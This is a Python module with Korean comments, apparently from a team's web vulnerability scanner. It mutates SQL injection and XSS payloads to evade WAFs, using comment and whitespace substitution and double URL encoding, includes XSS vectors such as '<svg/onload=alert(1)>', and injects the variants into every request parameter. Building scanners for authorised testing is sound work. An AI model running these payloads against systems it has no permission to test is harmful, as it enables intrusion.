"""
utils/mutator.py

PayloadMutator — 페이로드 변형 로직
- 팀원 원본 코드 (get_mutated_payloads, generate_attack_params) 유지
- XSS / SQLi 전용 변형 메서드 추가 패치
"""

import urllib.parse
import html


class PayloadMutator:

    # ------------------------------------------------------------------ #
    #  팀원 원본 코드 (수정 없이 유지)                                      #
    # ------------------------------------------------------------------ #

    def get_mutated_payloads(self, base_payload: str) -> list[str]:
        """
        원본 페이로드를 다양하게 변형해서 반환 (범용)
        - 팀원 원본 그대로 유지
        """
        mutations = set()
        mutations.add(base_payload)
        mutations.add(base_payload.upper())
        mutations.add(base_payload.lower())
        mutations.add(base_payload.replace(" ", "/**/"))
        mutations.add(urllib.parse.quote(base_payload))
        return list(mutations)

    def generate_attack_params(self, original_params: dict, target_key: str, payload: str) -> dict:
        """
        특정 파라미터 키에 페이로드를 주입한 파라미터 딕셔너리 반환
        - 팀원 원본 그대로 유지
        """
        attack_params = original_params.copy()
        attack_params[target_key] = payload
        return attack_params

    # ------------------------------------------------------------------ #
    #  패치 추가 — SQLi 전용 변형                                           #
    # ------------------------------------------------------------------ #

    def get_sqli_mutations(self, base_payload: str) -> list[str]:
        """
        SQLi 페이로드 전용 변형
        WAF 우회를 위한 공백 치환, 이중 인코딩, 연산자 변형 포함
        """
        mutations = set()

        mutations.add(base_payload)                                         # 원본
        mutations.add(base_payload.replace(" ", "/**/"))                    # 주석 공백 (팀원 원본과 동일, SQLi 전용으로 명시)
        mutations.add(base_payload.replace(" ", "%09"))                     # 탭 우회
        mutations.add(base_payload.replace(" ", "%0a"))                     # 개행 우회
        mutations.add(base_payload.replace(" ", "%0d%0a"))                  # CRLF 우회
        mutations.add(base_payload.replace("=", " LIKE "))                  # 연산자 변형
        mutations.add(urllib.parse.quote(base_payload))                     # URL 인코딩
        mutations.add(urllib.parse.quote(urllib.parse.quote(base_payload))) # 이중 URL 인코딩

        return list(mutations)

    # ------------------------------------------------------------------ #
    #  패치 추가 — XSS 전용 변형                                            #
    # ------------------------------------------------------------------ #

    def get_xss_mutations(self, base_payload: str) -> list[str]:
        """
        XSS 페이로드 전용 변형
        대소문자 우회, 태그 변형, SVG/img 벡터, href 벡터 포함
        """
        mutations = set()

        mutations.add(base_payload)                                          # 원본
        mutations.add(html.unescape(base_payload))                           # HTML 엔티티 디코딩
        mutations.add(base_payload.replace("<script>", "<ScRiPt>"))          # 대소문자 우회
        mutations.add(base_payload.replace("<script>", "<script >"))         # 공백 삽입 우회
        mutations.add(base_payload.replace("</script>", "</script >"))       # 닫는 태그 공백
        mutations.add("<img src=x onerror=alert(1)>")                        # img 태그 벡터
        mutations.add("<svg/onload=alert(1)>")                               # SVG 벡터
        mutations.add("javascript:alert(1)")                                 # href 벡터
        mutations.add(urllib.parse.quote(base_payload))                      # URL 인코딩

        return list(mutations)

    # ------------------------------------------------------------------ #
    #  패치 추가 — 전체 파라미터 순회 공격 생성                              #
    # ------------------------------------------------------------------ #

    def generate_all_attack_params(
        self,
        original_params: dict,
        payload: str,
        mode: str = "sqli",
    ) -> list[dict]:
        """
        파라미터 딕셔너리의 모든 키에 대해 변형 페이로드를 주입한
        공격 파라미터 목록을 반환

        Args:
            original_params: 원본 파라미터 딕셔너리 ex) {"id": "1", "page": "2"}
            payload:         기본 페이로드 문자열
            mode:            "sqli" | "xss"  — 변형 방식 선택

        Returns:
            [{"id": "<payload>", "page": "2"}, {"id": "<payload2>", ...}, ...]
        """
        if mode == "xss":
            mutations = self.get_xss_mutations(payload)
        else:
            mutations = self.get_sqli_mutations(payload)

        attack_list = []
        for key in original_params:
            for mutated in mutations:
                # 팀원 원본 generate_attack_params 재사용
                attack_params = self.generate_attack_params(original_params, key, mutated)
                attack_list.append({
                    "params":    attack_params,
                    "target_key": key,
                    "payload":   mutated,
                })

        return attack_list